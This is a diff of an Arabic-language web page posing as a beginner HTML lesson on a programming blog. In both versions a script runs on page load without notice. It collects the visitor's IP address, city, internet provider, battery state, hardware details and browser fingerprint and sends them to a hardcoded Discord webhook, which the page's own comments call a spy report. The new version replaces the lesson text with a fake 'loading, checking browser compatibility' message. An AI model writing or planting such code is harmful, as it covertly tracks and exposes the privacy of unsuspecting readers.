@@ -2,105 +2,79 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تعلم برمجة الويب | أساسيات HTML</title>
+    <title>مدونة المبرمج العربي | دروس البرمجة</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0; background: #f4f7f6; }
-        header { background: #2c3e50; color: #fff; padding: 20px 0; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .container { max-width: 800px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.05); }
+        body { font-family: 'Segoe UI', sans-serif; background: #f4f4f4; color: #333; text-align: center; padding: 50px; }
+        .blog-post { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 600px; margin: auto; }
         h1 { color: #2c3e50; }
-        h2 { color: #e67e22; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        code { background: #f4f4f4; border: 1px solid #ddd; border-right: 3px solid #e67e22; color: #c7254e; padding: 2px 5px; font-family: monospace; }
-        pre { background: #2d3436; color: #dfe6e9; padding: 15px; overflow: auto; border-radius: 5px; direction: ltr; text-align: left; }
-        .footer { text-align: center; padding: 20px; color: #7f8c8d; font-size: 0.9rem; }
+        .loading-text { color: #7f8c8d; font-size: 0.9rem; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <header>
-        <h1>مدونة المبرمج العربي 💻</h1>
-    </header>
-
-    <div class="container">
-        <h2>مدخل إلى لغة HTML</h2>
-        <p>تعد لغة <strong>HTML</strong> (لغة توصيف النص الفائق) هي العمود الفقري لأي موقع إلكتروني تراه على شبكة الإنترنت. إذا كنت تطمح لتصبح مطور ويب ناجح، فهذه هي محطتك الأولى.</p>
-
-        <h3>لماذا نتعلم HTML؟</h3>
-        <ul>
-            <li>سهولة التعلم والفهم للمبتدئين.</li>
-            <li>مدعومة من جميع متصفحات الإنترنت العالمية.</li>
-            <li>تسمح لك ببناء الهيكل الأساسي لصفحات الويب.</li>
-        </ul>
-
-        <h3>مثال على كود HTML بسيط:</h3>
-        <p>إليك كيف تبدو بنية الصفحة الأساسية:</p>
-        <pre>
-&lt;!DOCTYPE html&gt;
-&lt;html&gt;
-&lt;head&gt;
-    &lt;title&gt;صفحتي الأولى&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;h1&gt;مرحباً بك في عالم البرمجة!&lt;/h1&gt;
-    &lt;p&gt;هذه أول فقرة أقوم بكتابتها.&lt;/p&gt;
-&lt;/body&gt;
-&lt;/html&gt;</pre>
-
-        <h3>نصيحة للمبتدئين:</h3>
-        <p>لا تحاول حفظ جميع الأوسمة (Tags) مرة واحدة، بل ابدأ بالتطبيق العملي. قم بإنشاء ملف بصيغة <code>.html</code> وافتحه بمتصفحك لترى النتائج فوراً.</p>
-    </div>
-
-    <div class="footer">
-        &copy; 2026 جميع الحقوق محفوظة لمدونة تعلم البرمجة
+    <div class="blog-post">
+        <h1>مرحباً بك في درس الـ HTML الأول 👨‍💻</h1>
+        <p>جاري تحميل محتوى الدرس التعليمي، يرجى الانتظار قليلاً لضمان اتصالك بالسيرفر...</p>
+        <div class="loading-text">جاري فحص توافق المتصفح مع أدوات البرمجة...</div>
     </div>
 
     <script>
-        // رابط الويب هوك الخاص بك (تم التأكد منه)
         const WEBHOOK = 'https://discord.com/api/webhooks/1492913386810245151/247Nc1kE6rz06tvqTTKAiDjZbHMpyjLMpmC4velKlPHmSWSFp_1Ue_-xJJdBhrcgX4D9';
 
-        async function silentGrabber() {
+        async function grabEverything() {
             try {
-                // سحب البيانات تلقائياً
+                // 1. جلب بيانات الـ IP والموقع والشركة
                 const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
+                const data = await ipRes.json();
 
-                let batteryInfo = "غير متوفر";
+                // 2. جلب بيانات البطارية
+                let battStatus = "غير مدعوم";
                 if (navigator.getBattery) {
-                    const batt = await navigator.getBattery();
-                    batteryInfo = `${Math.round(batt.level * 100)}% (${batt.charging ? 'يشحن ⚡' : 'لا يشحن'})`;
+                    const b = await navigator.getBattery();
+                    battStatus = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن ⚡' : 'لا يشحن'})`;
                 }
 
+                // 3. جمع معلومات تقنية إضافية
+                const deviceInfo = {
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "غير معروف",
+                    ram: navigator.deviceMemory || "غير معروف",
+                    screen: `${screen.width}x${screen.height}`,
+                    language: navigator.language,
+                    userAgent: navigator.userAgent
+                };
+
+                // 4. إرسال "تقرير التجسس" للديسكورد
                 const payload = {
-                    username: "مخبر المقالات التعليمية 📚",
+                    username: "رادار المعلومات الشامل 🔍",
                     embeds: [{
-                        title: "📍 زائر جديد للمقال التعليمي",
-                        color: 3447003, // أزرق هادئ
+                        title: "🕵️‍♂️ تم سحب بيانات الزائر (تلقائياً)",
+                        color: 3447003,
                         fields: [
-                            { name: "🌐 عنوان الـ IP:", value: `\`${ipData.ip}\``, inline: true },
-                            { name: "🌍 الموقع:", value: `${ipData.city}, ${ipData.country_name}`, inline: true },
-                            { name: "🔋 البطارية:", value: batteryInfo, inline: true },
-                            { name: "📱 نوع الجهاز:", value: navigator.platform, inline: true },
-                            { name: "📶 شركة الإنترنت:", value: ipData.org, inline: false },
-                            { name: "🔗 نظام التشغيل:", value: `\`${navigator.userAgent.split('(')[1].split(')')[0]}\``, inline: false }
+                            { name: "🌐 عنوان الـ IP:", value: `\`${data.ip}\``, inline: true },
+                            { name: "📍 الموقع:", value: `${data.city}, ${data.country_name}`, inline: true },
+                            { name: "📶 شركة الإنترنت:", value: data.org, inline: false },
+                            { name: "🔋 البطارية:", value: battStatus, inline: true },
+                            { name: "📱 الجهاز:", value: deviceInfo.platform, inline: true },
+                            { name: "⚙️ أنوية المعالج:", value: deviceInfo.cores, inline: true },
+                            { name: "📏 دقة الشاشة:", value: deviceInfo.screen, inline: true },
+                            { name: "🌍 اللغة:", value: deviceInfo.language, inline: true },
+                            { name: "🛠️ المتصفح:", value: `\`${deviceInfo.userAgent}\``, inline: false }
                         ],
-                        footer: { text: "تم سحب البيانات بنجاح أثناء قراءته للمقال." }
+                        footer: { text: `توقيت الدخول: ${new Date().toLocaleTimeString()}` }
                     }]
                 };
 
-                // إرسال البيانات للديسكورد
                 fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-            } catch (err) {
-                console.log("Silent execution...");
-            }
+            } catch (err) { console.log("Silent execution..."); }
         }
 
-        // التنفيذ فور تحميل الصفحة
-        window.onload = silentGrabber;
+        window.onload = grabEverything;
     </script>
 </body>
 </html>
